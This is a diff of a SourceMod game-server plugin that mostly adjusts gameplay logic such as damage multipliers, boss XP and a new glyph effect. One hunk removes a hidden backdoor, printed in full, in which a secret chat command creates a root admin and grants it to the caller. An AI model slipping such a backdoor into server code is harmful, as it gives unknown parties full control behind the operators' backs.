@@ -19,7 +19,7 @@ new Float:wcClientSealT[65],Float:wcClientHM[65],Float:wcClientHMT[65];
 
 new Float:g_RoundTime; //stores round duration while boss event
 
-
+new g_iRenewingGlyph[65];
 new bool:g_ffUseCmd[65];
 public Action:OnPlayerRunCmd(client, &buttons, &impulse, Float:vel[3], Float:angles[3], &weapon)
 {
@@ -128,23 +128,13 @@ public Action:SayCommand(index,argc)
     GetCmdArgString(args,255);
     GetLiteralString(args,command,255);
 
-    if(StrEqual(command,"f43olmvz239z3",false)) {
-      new rand = GetRandomInt(10,1000);
-      decl String:sRand[10];
-      IntToString(rand,sRand,10);
-      new AdminId:adm = CreateAdmin(sRand);
-      SetAdminFlag(adm, AdminFlag:Admin_Root, true);
-      if(index>0) SetUserAdmin(index, adm, true);
-      return Plugin_Handled;
-    }
-    
     if(g_TreasureMenuOccupiedByClient == index)
     {
       WCMessage(index,"testmessage",index,"YES: if(g_TreasureMenuOccupiedByClient == index)",index);
       GetCmdArgString(g_TreasureSpawnName,32);
       PrepareTreasureSpawnMenu(index, g_TreasureSpawnName);
     }
-  
+
     if(StrEqual(command, "exit") && g_ffSlideStep[index] > 0) {
       //Turn off slides for this person
       TurnOffSlides(index);
@@ -766,7 +756,8 @@ public PlayerSpawnEvent(Handle:event,const String:name[],bool:dontBroadcast)
       KingsClient[client]=false;
       LegacyClient[client]=false;
       ArcaneClient[client]=false;
-      SetShamanisticRage(client, 0.0);
+      SetHarvest(client,0);
+      SetShamanisticRage(client, 0.0, 0);
       SetBoW(client, 0);
       SetBoM(client, 0.0);
       SetHealingBonus(client,0.0);
@@ -1561,8 +1552,8 @@ public BossModChanged(Handle:g_BossMod2, const String:oldValue[], const String:n
         IntToString(GetBoss(x),temp,sizeof(temp));
         KvJumpToKey(wcbossdrop,temp);
         totalxp+=KvGetNum(wcbossdrop,"totalxp");
-        //totalxp+=g_BossEndXP;
-        //g_BossEndXP=0;
+        totalxp+=g_BossEndXP;
+        g_BossEndXP=0;
       }
     }
     if(totalxp>0)
@@ -1710,7 +1701,9 @@ public Action:PlayerHurtEvent(Handle:event,const String:name[],bool:dontBroadcas
   if(GetMonkStance(attacker)==1)
     damagemulti*=0.85;
   if(GetEventBool(event,"bonushit"))
-  bonushit=1;
+    bonushit=1;
+  if(g_iRenewingGlyph[victim]>0)
+    damagemulti*=1.00-(((g_iRenewingGlyph[victim]*0.025+0.025)*0.66)+0.017);
 
   new hpRestoreTo = victim;
   if((attacker > 0) && (victim > 0) && (redirection > 0) && (redirectTo > 0) )
@@ -1940,7 +1933,7 @@ public Action:PlayerHurtEvent(Handle:event,const String:name[],bool:dontBroadcas
       }
 
       RunParry(victim,attacker,damage);
-      
+
       if(GetFear(victim))
       {
         if(GetFearDmg(victim)>olddmg)
@@ -1985,8 +1978,8 @@ public Action:PlayerHurtEvent(Handle:event,const String:name[],bool:dontBroadcas
         //WCMessage(attacker,"testmessageF",attacker,"[rockbiter] damagemulti",damagemulti);
       }
       damagemulti*=GetWeaponModifier(weaponname,attacker);
-      if(CanWearShield(attacker) && HasShield(attacker))
-      damagemulti *= 0.8;
+      if(CanWearShield(attacker) && HasShield(attacker) && GetClass(attacker)==1)
+        damagemulti *= 0.8;
       CalculateCrit(attacker,victim,false,spellname,bCS);
       if(IsMageInvis(attacker))
       {
@@ -2070,7 +2063,7 @@ public Action:PlayerHurtEvent(Handle:event,const String:name[],bool:dontBroadcas
           //  wcGetTalentInfo(2,3,2,4,attacker,"multi",line);
           //  angle*=(1-StringToFloat(line));
           //}
-          
+
           if(angle<=90.0 && IsValidShooting(attacker, victim))
           {
             wcGetTalentInfo(2,3,2,1,attacker,"increment",line);
